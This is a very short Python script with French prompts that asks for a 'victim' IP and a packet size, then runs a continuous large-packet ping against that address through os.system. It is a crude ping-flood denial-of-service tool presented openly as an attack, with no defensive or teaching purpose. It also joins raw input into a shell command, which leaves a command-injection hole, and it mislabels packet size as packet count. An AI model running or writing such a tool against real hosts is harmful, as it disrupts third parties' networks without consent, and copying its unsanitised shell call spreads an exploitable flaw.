import os

victime = input("IP Victime : ")
pakete = input("Nombre de Paquets (Maxi 6500) : ")
os.system("ping " + victime + " -t -l " + pakete)